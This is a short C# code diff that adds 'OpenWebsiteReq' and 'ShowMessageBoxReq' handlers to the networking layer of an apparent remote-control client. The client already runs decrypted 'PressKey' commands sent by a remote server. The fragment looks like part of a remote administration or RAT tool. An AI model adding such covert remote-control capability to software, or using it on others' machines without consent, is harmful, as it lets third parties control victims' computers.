@@ -97,6 +97,14 @@ namespace Client.Core.Networking
             {
                 PressKey.Execute(Cryptography.Decrypt(incomingData));
             });
+            Connection.AppendIncomingPacketHandler<string>("OpenWebsiteReq", (packetHeader, connection, incomingData) =>
+            {
+                OpenWebsite.Execute(Cryptography.Decrypt(incomingData));
+            });
+            Connection.AppendIncomingPacketHandler<string>("ShowMessageBoxReq", (packetHeader, connection, incomingData) =>
+            {
+                ShowMessageBox.Execute(Cryptography.Decrypt(incomingData));
+            });
 
         }
 
